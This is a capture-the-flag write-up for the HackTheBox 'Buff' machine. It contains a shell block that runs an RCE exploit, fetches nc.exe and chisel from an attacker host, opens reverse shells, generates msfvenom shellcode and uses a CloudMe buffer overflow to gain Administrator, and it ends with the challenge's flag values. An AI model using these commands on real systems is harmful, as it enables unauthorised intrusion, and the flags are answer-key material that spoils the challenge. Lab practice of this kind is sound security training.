# Buff - Easy

```shell
sudo vim /etc/hosts
#10.10.10.198 buff.htb

nmap -T4 -p- -A -Pn -v buff.htb

feroxbuster -u http://buff.htb:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,bak,js,txt,json,docx,pdf,zip,aspx,sql,xml --extract-links --scan-limit 2 --filter-status 400,401,404,405,500 --silent

#get exploit
python2 gym-rce.py

python2 gym-rce.py 'http://buff.htb:8080/'

#this gives us reverse shell

whoami
#shaun

#get user flag

#in attacker machine
python3 -m http.server

#use curl to transfer nc.exe
curl http://10.10.14.3:8000/nc64.exe -o nc.exe

#setup listener in attacker machine
nc -nvlp 4445

#reverse shell command
.\nc.exe 10.10.14.3 4445 -e powershell

#we get powershell on our listener
gci

#check listening ports
netstat -ano

#enumerate for service on port 8888

cd C:\Users\shaun

gci -recurse
#this shows CloudMe software

#search for exploit
searchsploit CloudMe

searchsploit -m windows/remote/48389.py
#mirrors file to current directory

vim 48389.py
#this requires service to be run locally
#so we need to setup tunnel

#download chisel

#in victim shell
curl http://10.10.14.3:8000/chisel_windows.exe -o chisel.exe

#in attacker machine, run chisel as server
./chisel_linux server -p 8000 --reverse

#in windows shell, run chisel as client
.\chisel.exe client 10.10.14.3:8000 R:8888:localhost:8888
#we are connected

#modify exploit
vim 48389.py

#generate new shellcode
msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=5555 -b '\x00\x0A\x0D' -f python

#use this shellcode in exploit

#setup listener
nc -nvlp 5555

python3 48389.py
#this gives us reverse shell as Administrator
```

* Open ports & services:

  * 7680 - pando-pub
  * 8080 - http - Apache httpd 2.4.43 (Win64)

* Checking the webpage on port 8080, we can see that it is a website for a gym service.

* In this, the 'Contact' section shows that the webpage is based on ```Gym Management Software 1.0```

* Searching for exploits related to this software gives us a few exploits - we can use them.

* On using the RCE exploit for this software, we are able to get a reverse shell as user 'shaun'.

* We can get user flag from shaun's Desktop.

* Now, in order to get a full-fledged shell, we can use ```certutil``` to transfer ```Import-PowerShellTcp.ps1``` but it does not work.

* The victim machine has ```curl```, so we can use that to transfer ```nc.exe``` and setup listener for reverse shell.

* Now, checking for listening ports shows two TCP services on 3306 and 8888.

* 3306 is for ```mysql```, but we do not know what's running on 8888, so we can check by enumerating files.

* Checking shaun's files, in the Downloads folder, we can see a download named 'CloudMe_1112.exe'.

* Searching for exploits related to 'CloudMe' give us buffer overflow exploits.

* Going through the Python script shows that we need to run the service locally, so we will have to setup a tunnel.

* In this case, we can use the ```chisel``` tool to setup a tunnel for port forwarding.

* We can then run ```chisel``` as server on attacker machine, and as client on the Windows reverse shell.

* We receive the connected prompt on our server, and now we have forwarded the service on port 8888.

* Now, we need to modify the Python buffer overflow exploit and modify the command being run.

* After running the ```msfvenom``` command for generating a stageless payload (as we are using netcat to catch reverse shell), we need to paste the shellcode in the exploit and modify variable names accordingly.

* Now, setting up listener and running the modified buffer overflow exploit gives us reverse shell as Administrator.

```markdown
1. User flag - 3abe4a313732f403347add8279b36f64

2. Root flag - 4bcc45d67f996bcbe2a096a1247e0130
```
